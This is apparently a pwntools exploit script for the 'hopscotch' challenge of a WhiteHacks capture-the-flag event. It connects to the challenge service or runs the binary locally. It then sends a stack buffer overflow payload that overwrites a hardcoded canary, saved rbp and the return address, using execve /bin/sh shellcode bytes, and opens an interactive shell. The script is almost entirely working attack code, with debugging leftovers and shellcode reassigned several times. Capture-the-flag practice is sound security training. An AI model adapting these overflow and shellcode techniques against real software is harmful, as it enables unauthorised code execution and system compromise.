from pwn import *

HOST = 'chals.whitehacks.ctf.sg' # change this if required
PORT = 20401   # change this if required

try:
    import time
    time.sleep(1)
    io= process('./hopscotch')
except:
    io = remote(HOST, PORT) # connects to the service

inputData = io.recvuntil('Enter input:').decode()
buffer = int(inputData[8:8+14], base=16)
buffer = int("0x7ffffffedd10", base=16) # For debugging
#buffer = int("0x7ffffffee320", base=16) # For debugging

print("### Given ###################")
print(inputData)
print("#############################")
print("$rsp:",hex(buffer))
shellcodeLocation = buffer
print("Shellcode location on stack:", hex(shellcodeLocation))

canary = p32(0x0000539) #Can be found in code
rbp = p64(buffer) #b'A'*8 if False else p64(0x004012c0)
#rip = p64(shellcodeLocation) # Where rip is
#rip = p64(shellcodeLocation) # Where rip is
#rip = p64(0x0000000000401261) ## Fun if you want to loop back to original position
rip = p64(0x7fffff628e50)

#http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = b'\x90'*0 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode = (b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f" +
              b"\x73\x68\x68\x2f\x62\x69\x6e\x89" +
              b"\xe3\xb0\x0b\xcd\x80")
shellcode = b" /bin/sh"[::-1]
### Overwrite Canary ################################################
canaryBypass = shellcode + b'A'*(48-len(shellcode)) + canary + b'A'*(12) 

### Overwrite Canary ################################################
payload = canaryBypass + rbp + rip #+shellcode

#payload = b'A'*240
with open('testinput', 'wb') as f: f.write(payload)
print(payload)
io.sendline(payload) # sends your payload to the service

print("### Given ###################")
io.interactive() # allows you to interact with service manually

